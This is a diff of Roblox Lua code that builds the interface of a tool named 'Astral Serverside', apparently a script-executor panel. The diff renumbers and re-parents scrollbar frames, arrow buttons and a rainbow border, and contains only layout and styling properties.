+ASTRAL["20"]["Position"] = UDim2.new(0, 8, 0, 6);
 ASTRAL["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
 ASTRAL["20"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
-ASTRAL["21"] = Instance.new("Frame", ASTRAL["1d"]);
-ASTRAL["21"]["BorderSizePixel"] = 0;
-ASTRAL["21"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["21"]["Size"] = UDim2.new(0, 1, 0, 1);
-ASTRAL["21"]["Position"] = UDim2.new(0, 8, 0, 6);
-ASTRAL["21"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
-ASTRAL["21"]["BackgroundTransparency"] = 0.5;
-
-
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Button
-ASTRAL["22"] = Instance.new("TextButton", ASTRAL["1c"]);
-ASTRAL["22"]["BorderSizePixel"] = 0;
-ASTRAL["22"]["TextSize"] = 14;
-ASTRAL["22"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["22"]["BackgroundTransparency"] = 1;
-ASTRAL["22"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["22"]["Text"] = [[]];
-ASTRAL["22"]["Name"] = [[Button]];
+ASTRAL["21"] = Instance.new("TextButton", ASTRAL["1b"]);
+ASTRAL["21"]["BorderSizePixel"] = 0;
+ASTRAL["21"]["TextSize"] = 14;
+ASTRAL["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["21"]["BackgroundTransparency"] = 1;
+ASTRAL["21"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["21"]["Text"] = [[]];
+ASTRAL["21"]["Name"] = [[Button]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm
-ASTRAL["23"] = Instance.new("Frame", ASTRAL["10"]);
-ASTRAL["23"]["Visible"] = false;
-ASTRAL["23"]["ZIndex"] = 3;
-ASTRAL["23"]["BorderSizePixel"] = 0;
-ASTRAL["23"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
-ASTRAL["23"]["Size"] = UDim2.new(0, 17, 0, 17);
-ASTRAL["23"]["Position"] = UDim2.new(1, -17, 1, -17);
-ASTRAL["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["23"]["Name"] = [[Y_Btm]];
+ASTRAL["22"] = Instance.new("Frame", ASTRAL["f"]);
+ASTRAL["22"]["Visible"] = false;
+ASTRAL["22"]["ZIndex"] = 3;
+ASTRAL["22"]["BorderSizePixel"] = 0;
+ASTRAL["22"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
+ASTRAL["22"]["Size"] = UDim2.new(0, 17, 0, 17);
+ASTRAL["22"]["Position"] = UDim2.new(1, -17, 1, -17);
+ASTRAL["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["22"]["Name"] = [[Y_Btm]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Button
-ASTRAL["24"] = Instance.new("TextButton", ASTRAL["23"]);
-ASTRAL["24"]["BorderSizePixel"] = 0;
-ASTRAL["24"]["TextSize"] = 14;
-ASTRAL["24"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["24"]["BackgroundTransparency"] = 1;
-ASTRAL["24"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["24"]["Text"] = [[]];
-ASTRAL["24"]["Name"] = [[Button]];
+ASTRAL["23"] = Instance.new("TextButton", ASTRAL["22"]);
+ASTRAL["23"]["BorderSizePixel"] = 0;
+ASTRAL["23"]["TextSize"] = 14;
+ASTRAL["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["23"]["BackgroundTransparency"] = 1;
+ASTRAL["23"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["23"]["Text"] = [[]];
+ASTRAL["23"]["Name"] = [[Button]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow
-ASTRAL["25"] = Instance.new("Frame", ASTRAL["23"]);
-ASTRAL["25"]["Size"] = UDim2.new(0, 16, 0, 16);
-ASTRAL["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
-ASTRAL["25"]["Name"] = [[Arrow]];
-ASTRAL["25"]["BackgroundTransparency"] = 1;
+ASTRAL["24"] = Instance.new("Frame", ASTRAL["22"]);
+ASTRAL["24"]["Size"] = UDim2.new(0, 16, 0, 16);
+ASTRAL["24"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+ASTRAL["24"]["Name"] = [[Arrow]];
+ASTRAL["24"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
-ASTRAL["26"] = Instance.new("Frame", ASTRAL["25"]);
+ASTRAL["25"] = Instance.new("Frame", ASTRAL["24"]);
+ASTRAL["25"]["BorderSizePixel"] = 0;
+ASTRAL["25"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
+ASTRAL["25"]["Size"] = UDim2.new(0, 7, 0, 1);
+ASTRAL["25"]["Position"] = UDim2.new(0, 5, 0, 7);
+ASTRAL["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+ASTRAL["25"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
+ASTRAL["26"] = Instance.new("Frame", ASTRAL["24"]);
 ASTRAL["26"]["BorderSizePixel"] = 0;
 ASTRAL["26"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["26"]["Size"] = UDim2.new(0, 7, 0, 1);
-ASTRAL["26"]["Position"] = UDim2.new(0, 5, 0, 7);
+ASTRAL["26"]["Size"] = UDim2.new(0, 5, 0, 1);
+ASTRAL["26"]["Position"] = UDim2.new(0, 6, 0, 8);
 ASTRAL["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
 ASTRAL["26"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
-ASTRAL["27"] = Instance.new("Frame", ASTRAL["25"]);
+ASTRAL["27"] = Instance.new("Frame", ASTRAL["24"]);
 ASTRAL["27"]["BorderSizePixel"] = 0;
 ASTRAL["27"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["27"]["Size"] = UDim2.new(0, 5, 0, 1);
-ASTRAL["27"]["Position"] = UDim2.new(0, 6, 0, 8);
+ASTRAL["27"]["Size"] = UDim2.new(0, 3, 0, 1);
+ASTRAL["27"]["Position"] = UDim2.new(0, 7, 0, 9);
 ASTRAL["27"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
 ASTRAL["27"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
-ASTRAL["28"] = Instance.new("Frame", ASTRAL["25"]);
+ASTRAL["28"] = Instance.new("Frame", ASTRAL["24"]);
 ASTRAL["28"]["BorderSizePixel"] = 0;
 ASTRAL["28"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["28"]["Size"] = UDim2.new(0, 3, 0, 1);
-ASTRAL["28"]["Position"] = UDim2.new(0, 7, 0, 9);
+ASTRAL["28"]["Size"] = UDim2.new(0, 1, 0, 1);
+ASTRAL["28"]["Position"] = UDim2.new(0, 8, 0, 10);
 ASTRAL["28"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
 ASTRAL["28"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
-ASTRAL["29"] = Instance.new("Frame", ASTRAL["25"]);
-ASTRAL["29"]["BorderSizePixel"] = 0;
-ASTRAL["29"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["29"]["Size"] = UDim2.new(0, 1, 0, 1);
-ASTRAL["29"]["Position"] = UDim2.new(0, 8, 0, 10);
-ASTRAL["29"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
-ASTRAL["29"]["BackgroundTransparency"] = 0.5;
-
-
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft
-ASTRAL["2a"] = Instance.new("Frame", ASTRAL["10"]);
-ASTRAL["2a"]["Visible"] = false;
-ASTRAL["2a"]["ZIndex"] = 3;
-ASTRAL["2a"]["BorderSizePixel"] = 0;
-ASTRAL["2a"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
-ASTRAL["2a"]["Size"] = UDim2.new(0, 17, 0, 17);
-ASTRAL["2a"]["Position"] = UDim2.new(0, 0, 1, -17);
-ASTRAL["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["2a"]["Name"] = [[X_Lft]];
+ASTRAL["29"] = Instance.new("Frame", ASTRAL["f"]);
+ASTRAL["29"]["Visible"] = false;
+ASTRAL["29"]["ZIndex"] = 3;
+ASTRAL["29"]["BorderSizePixel"] = 0;
+ASTRAL["29"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
+ASTRAL["29"]["Size"] = UDim2.new(0, 17, 0, 17);
+ASTRAL["29"]["Position"] = UDim2.new(0, 0, 1, -17);
+ASTRAL["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["29"]["Name"] = [[X_Lft]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Button
-ASTRAL["2b"] = Instance.new("TextButton", ASTRAL["2a"]);
-ASTRAL["2b"]["BorderSizePixel"] = 0;
-ASTRAL["2b"]["TextSize"] = 14;
-ASTRAL["2b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["2b"]["BackgroundTransparency"] = 1;
-ASTRAL["2b"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["2b"]["Text"] = [[]];
-ASTRAL["2b"]["Name"] = [[Button]];
+ASTRAL["2a"] = Instance.new("TextButton", ASTRAL["29"]);
+ASTRAL["2a"]["BorderSizePixel"] = 0;
+ASTRAL["2a"]["TextSize"] = 14;
+ASTRAL["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["2a"]["BackgroundTransparency"] = 1;
+ASTRAL["2a"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["2a"]["Text"] = [[]];
+ASTRAL["2a"]["Name"] = [[Button]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow
-ASTRAL["2c"] = Instance.new("Frame", ASTRAL["2a"]);
-ASTRAL["2c"]["Size"] = UDim2.new(0, 16, 0, 16);
-ASTRAL["2c"]["Name"] = [[Arrow]];
-ASTRAL["2c"]["BackgroundTransparency"] = 1;
+ASTRAL["2b"] = Instance.new("Frame", ASTRAL["29"]);
+ASTRAL["2b"]["Size"] = UDim2.new(0, 16, 0, 16);
+ASTRAL["2b"]["Name"] = [[Arrow]];
+ASTRAL["2b"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
-ASTRAL["2d"] = Instance.new("Frame", ASTRAL["2c"]);
+ASTRAL["2c"] = Instance.new("Frame", ASTRAL["2b"]);
+ASTRAL["2c"]["BorderSizePixel"] = 0;
+ASTRAL["2c"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
+ASTRAL["2c"]["Size"] = UDim2.new(0, 1, 0, 1);
+ASTRAL["2c"]["Position"] = UDim2.new(0, 6, 0, 8);
+ASTRAL["2c"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
+ASTRAL["2d"] = Instance.new("Frame", ASTRAL["2b"]);
 ASTRAL["2d"]["BorderSizePixel"] = 0;
 ASTRAL["2d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["2d"]["Size"] = UDim2.new(0, 1, 0, 1);
-ASTRAL["2d"]["Position"] = UDim2.new(0, 6, 0, 8);
+ASTRAL["2d"]["Size"] = UDim2.new(0, 1, 0, 3);
+ASTRAL["2d"]["Position"] = UDim2.new(0, 7, 0, 7);
 ASTRAL["2d"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
-ASTRAL["2e"] = Instance.new("Frame", ASTRAL["2c"]);
+ASTRAL["2e"] = Instance.new("Frame", ASTRAL["2b"]);
 ASTRAL["2e"]["BorderSizePixel"] = 0;
 ASTRAL["2e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["2e"]["Size"] = UDim2.new(0, 1, 0, 3);
-ASTRAL["2e"]["Position"] = UDim2.new(0, 7, 0, 7);
+ASTRAL["2e"]["Size"] = UDim2.new(0, 1, 0, 5);
+ASTRAL["2e"]["Position"] = UDim2.new(0, 8, 0, 6);
 ASTRAL["2e"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
-ASTRAL["2f"] = Instance.new("Frame", ASTRAL["2c"]);
+ASTRAL["2f"] = Instance.new("Frame", ASTRAL["2b"]);
 ASTRAL["2f"]["BorderSizePixel"] = 0;
 ASTRAL["2f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["2f"]["Size"] = UDim2.new(0, 1, 0, 5);
-ASTRAL["2f"]["Position"] = UDim2.new(0, 8, 0, 6);
+ASTRAL["2f"]["Size"] = UDim2.new(0, 1, 0, 7);
+ASTRAL["2f"]["Position"] = UDim2.new(0, 9, 0, 5);
 ASTRAL["2f"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
-ASTRAL["30"] = Instance.new("Frame", ASTRAL["2c"]);
-ASTRAL["30"]["BorderSizePixel"] = 0;
-ASTRAL["30"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["30"]["Size"] = UDim2.new(0, 1, 0, 7);
-ASTRAL["30"]["Position"] = UDim2.new(0, 9, 0, 5);
-ASTRAL["30"]["BackgroundTransparency"] = 0.5;
-
-
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght
-ASTRAL["31"] = Instance.new("Frame", ASTRAL["10"]);
-ASTRAL["31"]["Visible"] = false;
-ASTRAL["31"]["ZIndex"] = 3;
-ASTRAL["31"]["BorderSizePixel"] = 0;
-ASTRAL["31"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
-ASTRAL["31"]["Size"] = UDim2.new(0, 17, 0, 17);
-ASTRAL["31"]["Position"] = UDim2.new(1, -18, 1, -17);
-ASTRAL["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["31"]["Name"] = [[X_Rght]];
+ASTRAL["30"] = Instance.new("Frame", ASTRAL["f"]);
+ASTRAL["30"]["Visible"] = false;
+ASTRAL["30"]["ZIndex"] = 3;
+ASTRAL["30"]["BorderSizePixel"] = 0;
+ASTRAL["30"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
+ASTRAL["30"]["Size"] = UDim2.new(0, 17, 0, 17);
+ASTRAL["30"]["Position"] = UDim2.new(1, -18, 1, -17);
+ASTRAL["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["30"]["Name"] = [[X_Rght]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Button
-ASTRAL["32"] = Instance.new("TextButton", ASTRAL["31"]);
-ASTRAL["32"]["BorderSizePixel"] = 0;
-ASTRAL["32"]["TextSize"] = 14;
-ASTRAL["32"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-ASTRAL["32"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-ASTRAL["32"]["BackgroundTransparency"] = 1;
-ASTRAL["32"]["Size"] = UDim2.new(1, 0, 1, 0);
-ASTRAL["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["32"]["Text"] = [[]];
-ASTRAL["32"]["Name"] = [[Button]];
+ASTRAL["31"] = Instance.new("TextButton", ASTRAL["30"]);
+ASTRAL["31"]["BorderSizePixel"] = 0;
+ASTRAL["31"]["TextSize"] = 14;
+ASTRAL["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+ASTRAL["31"]["BackgroundTransparency"] = 1;
+ASTRAL["31"]["Size"] = UDim2.new(1, 0, 1, 0);
+ASTRAL["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["31"]["Text"] = [[]];
+ASTRAL["31"]["Name"] = [[Button]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow
-ASTRAL["33"] = Instance.new("Frame", ASTRAL["31"]);
-ASTRAL["33"]["Size"] = UDim2.new(0, 16, 0, 16);
-ASTRAL["33"]["Name"] = [[Arrow]];
-ASTRAL["33"]["BackgroundTransparency"] = 1;
+ASTRAL["32"] = Instance.new("Frame", ASTRAL["30"]);
+ASTRAL["32"]["Size"] = UDim2.new(0, 16, 0, 16);
+ASTRAL["32"]["Name"] = [[Arrow]];
+ASTRAL["32"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
-ASTRAL["34"] = Instance.new("Frame", ASTRAL["33"]);
+ASTRAL["33"] = Instance.new("Frame", ASTRAL["32"]);
+ASTRAL["33"]["BorderSizePixel"] = 0;
+ASTRAL["33"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
+ASTRAL["33"]["Size"] = UDim2.new(0, 1, 0, 1);
+ASTRAL["33"]["Position"] = UDim2.new(0, 10, 0, 8);
+ASTRAL["33"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
+ASTRAL["34"] = Instance.new("Frame", ASTRAL["32"]);
 ASTRAL["34"]["BorderSizePixel"] = 0;
 ASTRAL["34"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["34"]["Size"] = UDim2.new(0, 1, 0, 1);
-ASTRAL["34"]["Position"] = UDim2.new(0, 10, 0, 8);
+ASTRAL["34"]["Size"] = UDim2.new(0, 1, 0, 3);
+ASTRAL["34"]["Position"] = UDim2.new(0, 9, 0, 7);
 ASTRAL["34"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
-ASTRAL["35"] = Instance.new("Frame", ASTRAL["33"]);
+ASTRAL["35"] = Instance.new("Frame", ASTRAL["32"]);
 ASTRAL["35"]["BorderSizePixel"] = 0;
 ASTRAL["35"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["35"]["Size"] = UDim2.new(0, 1, 0, 3);
-ASTRAL["35"]["Position"] = UDim2.new(0, 9, 0, 7);
+ASTRAL["35"]["Size"] = UDim2.new(0, 1, 0, 5);
+ASTRAL["35"]["Position"] = UDim2.new(0, 8, 0, 6);
 ASTRAL["35"]["BackgroundTransparency"] = 0.5;
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
-ASTRAL["36"] = Instance.new("Frame", ASTRAL["33"]);
+ASTRAL["36"] = Instance.new("Frame", ASTRAL["32"]);
 ASTRAL["36"]["BorderSizePixel"] = 0;
 ASTRAL["36"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["36"]["Size"] = UDim2.new(0, 1, 0, 5);
-ASTRAL["36"]["Position"] = UDim2.new(0, 8, 0, 6);
+ASTRAL["36"]["Size"] = UDim2.new(0, 1, 0, 7);
+ASTRAL["36"]["Position"] = UDim2.new(0, 7, 0, 5);
 ASTRAL["36"]["BackgroundTransparency"] = 0.5;
 
 
--- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
-ASTRAL["37"] = Instance.new("Frame", ASTRAL["33"]);
-ASTRAL["37"]["BorderSizePixel"] = 0;
-ASTRAL["37"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
-ASTRAL["37"]["Size"] = UDim2.new(0, 1, 0, 7);
-ASTRAL["37"]["Position"] = UDim2.new(0, 7, 0, 5);
-ASTRAL["37"]["BackgroundTransparency"] = 0.5;
-
-
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Ground
-ASTRAL["38"] = Instance.new("Frame", ASTRAL["10"]);
-ASTRAL["38"]["Visible"] = false;
-ASTRAL["38"]["ZIndex"] = 2;
-ASTRAL["38"]["BorderSizePixel"] = 0;
-ASTRAL["38"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
-ASTRAL["38"]["Size"] = UDim2.new(0, 17, 0, 17);
-ASTRAL["38"]["Position"] = UDim2.new(1, -17, 1, -17);
-ASTRAL["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["38"]["Name"] = [[Ground]];
+ASTRAL["37"] = Instance.new("Frame", ASTRAL["f"]);
+ASTRAL["37"]["Visible"] = false;
+ASTRAL["37"]["ZIndex"] = 2;
+ASTRAL["37"]["BorderSizePixel"] = 0;
+ASTRAL["37"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
+ASTRAL["37"]["Size"] = UDim2.new(0, 17, 0, 17);
+ASTRAL["37"]["Position"] = UDim2.new(1, -17, 1, -17);
+ASTRAL["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["37"]["Name"] = [[Ground]];
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Bar
-ASTRAL["39"] = Instance.new("Frame", ASTRAL["10"]);
+ASTRAL["38"] = Instance.new("Frame", ASTRAL["f"]);
+ASTRAL["38"]["Visible"] = false;
+ASTRAL["38"]["ZIndex"] = 2;
+ASTRAL["38"]["BorderSizePixel"] = 0;
+ASTRAL["38"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+ASTRAL["38"]["Size"] = UDim2.new(0, 17, 1, -17);
+ASTRAL["38"]["Position"] = UDim2.new(1, -17, 0, 0);
+ASTRAL["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+ASTRAL["38"]["Name"] = [[Y_Bar]];
+ASTRAL["38"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Bar
+ASTRAL["39"] = Instance.new("Frame", ASTRAL["f"]);
 ASTRAL["39"]["Visible"] = false;
 ASTRAL["39"]["ZIndex"] = 2;
 ASTRAL["39"]["BorderSizePixel"] = 0;
 ASTRAL["39"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
-ASTRAL["39"]["Size"] = UDim2.new(0, 17, 1, -17);
-ASTRAL["39"]["Position"] = UDim2.new(1, -17, 0, 0);
+ASTRAL["39"]["Size"] = UDim2.new(1, -17, 0, 17);
+ASTRAL["39"]["Position"] = UDim2.new(0, 0, 1, -17);
 ASTRAL["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["39"]["Name"] = [[Y_Bar]];
+ASTRAL["39"]["Name"] = [[X_Bar]];
 ASTRAL["39"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Bar
-ASTRAL["3a"] = Instance.new("Frame", ASTRAL["10"]);
-ASTRAL["3a"]["Visible"] = false;
-ASTRAL["3a"]["ZIndex"] = 2;
-ASTRAL["3a"]["BorderSizePixel"] = 0;
-ASTRAL["3a"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
-ASTRAL["3a"]["Size"] = UDim2.new(1, -17, 0, 17);
-ASTRAL["3a"]["Position"] = UDim2.new(0, 0, 1, -17);
-ASTRAL["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-ASTRAL["3a"]["Name"] = [[X_Bar]];
-ASTRAL["3a"]["BackgroundTransparency"] = 1;
-
-
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border
-ASTRAL["3b"] = Instance.new("UIStroke", ASTRAL["10"]);
-ASTRAL["3b"]["Name"] = [[Border]];
-ASTRAL["3b"]["Color"] = Color3.fromRGB(255, 255, 255);
+ASTRAL["3a"] = Instance.new("UIStroke", ASTRAL["f"]);
+ASTRAL["3a"]["Name"] = [[Border]];
+ASTRAL["3a"]["Color"] = Color3.fromRGB(255, 255, 255);
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow
-ASTRAL["3c"] = Instance.new("UIGradient", ASTRAL["3b"]);
-ASTRAL["3c"]["Name"] = [[Rainbow]];
-ASTRAL["3c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};
+ASTRAL["3b"] = Instance.new("UIGradient", ASTRAL["3a"]);
+ASTRAL["3b"]["Name"] = [[Rainbow]];
+ASTRAL["3b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};
 
 
 -- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
-ASTRAL["3d"] = Instance.new("LocalScript", ASTRAL["3c"]);
-ASTRAL["3d"]["Name"] = [[Rotation]];
+ASTRAL["3c"] = Instance.new("LocalScript", ASTRAL["3b"]);
+ASTRAL["3c"]["Name"] = [[Rotation]];
 
 
